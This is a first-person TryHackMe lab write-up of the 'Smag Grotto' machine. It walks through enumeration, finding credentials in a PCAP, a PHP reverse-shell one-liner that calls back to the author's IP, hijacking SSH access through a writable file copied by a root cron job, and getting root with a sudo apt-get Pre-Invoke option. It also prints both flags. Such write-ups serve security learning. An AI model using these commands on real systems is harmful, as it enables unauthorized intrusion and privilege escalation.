# Smag Grotto: TryHackMe Write-up

## 1. Reconnaissance

I started by obtaining the target IP:

```text
10.130.188.255
```

Then I performed an Nmap scan with service detection and default scripts:

```bash
nmap -sV -sC -oN scan 10.130.188.255
```

The scan showed two open ports:

```text
22/tcp  open  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp  open  http  Apache httpd 2.4.18 (Ubuntu)
```

The web server was running Apache on port 80, while SSH was available on port 22.

## 2. Web Enumeration

I opened the website in a browser, but there was no useful information on the main page.

I then performed directory enumeration using FFUF:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
-u http://110.130.188.255/FUZZ
```

One interesting directory was discovered:

```text
/mail
```

I accessed `/mail` and found a PCAP file.

## 3. Analyzing the PCAP

I downloaded the PCAP file and opened it with Wireshark:

```bash
wireshark dHJhY2Uy.pcap
```

While inspecting the HTTP traffic, I found a POST request to `/login.php`:

```http
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0w
```

This revealed valid credentials:

```text
Username: helpdesk
Password: cH4nG3M3_n0w
```

The request also revealed the hostname:

```text
development.smag.thm
```

I added the domains to `/etc/hosts`:

```text
10.130.188.255 smag.thm development.smag.thm
```

## 4. Accessing the Development Website

I then accessed:

```text
http://development.smag.thm/login.php
```

I logged in using the credentials found in the PCAP:

```text
helpdesk:cH4nG3M3_n0w
```

After logging in, I obtained access to an administrative panel containing a field where I could execute commands.

## 5. Getting a Reverse Shell

I started a Netcat listener on my machine:

```bash
nc -lvnp 4444
```

I then used the command execution functionality on the website to execute a PHP reverse shell:

```bash
php -r '$sock=fsockopen("192.168.137.126",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

The connection was received successfully.

I had obtained a shell as:

```text
www-data
```

## 6. Finding a Cron Job

I started looking for a way to escalate privileges.

I checked the system-wide crontab:

```bash
cat /etc/crontab
```

Among the normal scheduled tasks, I found this interesting entry:

```text
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

This command runs **every minute as root**.

It copies:

```text
/opt/.backups/jake_id_rsa.pub.backup
```

to:

```text
/home/jake/.ssh/authorized_keys
```

I checked the permissions of the source file:

```bash
ls -al /opt/.backups/jake_id_rsa.pub.backup
```

The result showed:

```text
-rw-rw-rw- 1 root root 94 Oct  4 06:22 /opt/.backups/jake_id_rsa.pub.backup
```

The file was writable, which meant I could replace its contents.

## 7. Creating an SSH Key

On my machine, I generated a new Ed25519 SSH key pair:

```bash
ssh-keygen -t ed25519 -f test_key
```

This created:

```text
test_key
test_key.pub
```

I protected the private key:

```bash
chmod 600 test_key
```

I then used the public key from `test_key.pub` as the contents of:

```text
/opt/.backups/jake_id_rsa.pub.backup
```

The public key had the following format:

```text
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKi8Z3cWFm5bkyHlZSBKrZsC/VtzFkKBPGFDwaK2BGWJ hamza@hamza
```

I then waited for the cron job to execute.

Because the cron job runs every minute as root, it copied my public key into:

```text
/home/jake/.ssh/authorized_keys
```

## 8. SSH as Jake

Once the cron job had executed, I used the corresponding private key to authenticate as Jake:

```bash
ssh -i test_key jake@10.130.188.255
```

This successfully gave me a shell as:

```text
jake
```

I then retrieved the user flag:

```bash
cat user.txt
```

```text
iusGorV7EbmxM5AuIe2w499msaSuqU3j
```

## 9. Privilege Escalation

Next, I checked which commands Jake could execute with sudo:

```bash
sudo -l
```

The output showed:

```text
User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

This meant Jake could execute `apt-get` as root without providing a password.

I used the `APT::Update::Pre-Invoke` option to execute a shell before the update operation:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"
```

This spawned a shell with root privileges.

I verified the privileges:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

I was now root.

## 10. Root Flag

I moved to the root directory:

```bash
cd /root
```

Then listed the files:

```bash
ls
```

The root flag was present as:

```text
root.txt
```

I retrieved it with:

```bash
cat root.txt
```

```text
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```

## Conclusion

The machine involved several stages of exploitation.

The initial enumeration revealed an Apache web server and a `/mail` directory containing a PCAP file. Analyzing the PCAP exposed credentials for the development website. The development panel then provided command execution, which allowed me to obtain a reverse shell as `www-data`.

From there, I discovered a root-owned cron job that copied a writable public-key backup file into Jake's `authorized_keys`. By replacing the public key with one corresponding to a private key I controlled, I was able to SSH as Jake.

Finally, `sudo -l` showed that Jake could execute `apt-get` as root without a password. Abusing the `Pre-Invoke` option provided a root shell, allowing me to retrieve the root flag.